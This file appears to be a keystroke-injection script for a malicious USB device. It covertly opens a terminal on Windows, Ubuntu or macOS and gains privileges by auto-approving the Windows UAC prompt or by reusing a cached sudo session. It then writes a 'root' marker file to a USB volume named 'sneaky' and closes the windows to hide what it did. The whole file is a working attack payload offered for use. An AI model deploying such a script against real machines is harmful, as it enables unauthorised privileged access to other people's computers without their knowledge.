typingSpeed(10,0)

// will be changed via sed
var lang = 'de'
var os = 'Windows'

// set keyboard language
layout(lang)

// helpers
function runPrivPowershell() {
    press("GUI r") // windows + r
    delay(500)
    type("powershell") // write powershell and press "enter"
  	press("CTRL SHIFT RETURN")
    delay(2000)
  	press("ALT J")
  	delay(3000)
}

function ubuntuTerminal() {
    press("GUI")
    // window effects delay
    // especially if running in VM
    delay(5000)
    type("ter\n")
    // use less delay later
  	delay(5000)
}

function macTerminal() {
  press("GUI SPACE")
  // window effects delay
  // especially if running in VM
  // term needed - otherwise it's textedit
  delay(5000)
  type("termi\n")
  // use less delay later
  delay(5000)
}

function createWindowsFile() {
  // get drive name of mass storage, improved version: only the value!
  type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'sneaky' } | select -expand name\n")
	type("[IO.File]::WriteAllLines((Join-Path $usbPath 'root.txt'), 'root') ; Write-VolumeCache $usbPath[0]\n")
}

function createUbuntuFile() {
    // path: /media/$(users)/sneaky
  	// this does only work if passwordless sudo is configured
  	// OR the last time the user entered the password is not long ago (default: 5min)
  	// we can use a cached password because the way we open the terminal does use the latest open terminal
  	// this can be a problem if the recent opened terminal is in a SSH session
    type("if [ $(sudo id -u) -eq 0 ]; then echo \"root\" > /media/$(users)/sneaky/root.txt && sync ; fi\n")
    delay(1500)
    press("CTRL D") // close the PAM password input OR the terminal
  	press("CTRL D") // close the terminal --> might close another open terminal if one has been open
}

function createMacFile() {
  // TODO: check all language bruteforce
  // path: /Volumes/sneaky
  
  if (lang === "de") {
    
    type("if ")
    // [
    press("ALT 5");
    type(" $(sudo id -u) -eq 0 ")
	// ] 
	press("ALT 6");
    type("; then echo \"root\" ° /Volumes/sneaky/root.txt && sync ; fi\n")
  }
  else if (lang === "us") {
    type("if [ $(sudo id -u) -eq 0 ]; then echo \"root\" > /Volumes/sneaky/root.txt && sync ; fi\n")
  }
  else {
    // french
    
    //type("°!\"§$%&/()=?QWERTZUIOPÜ*ASDFGHJKLÖÄ'>YXCVBNM;:_")
    
    
    type("if ")
    // [
    press("SHIFT [")
    type(" $(sudo id =u) =eq 0 ")
    // ]
    press("SHIFT ]")
    type("; then echo \"root\" ")
    
    // workaround to fix the broken french layout
    // >
    layout("us")
    press("SHIFT Ü");
    type("~");
    layout(lang)
    
    type(" /Volumes/sneaky/root.txt && sync ; fi\n")
    
  }
  
  delay(500)
  press("CTRL D") // close the password input OR the terminal
  delay(500)
  press("WIN Q") // close the terminal
}


if (os === "Windows") {
  // if priv elevation does not work there will be 3 login tries because of the cmds
  runPrivPowershell()
  createWindowsFile()
  type("exit\n")
  delay(2000)
  press("ESC")  // close UAC if failed
  delay(500)
  press("ESC") // close run if failed
}

else if (os === "Ubuntu") {
  ubuntuTerminal()
  createUbuntuFile(lang)
}

else if (os === "Mac") {
  macTerminal()
  createMacFile(lang)
}
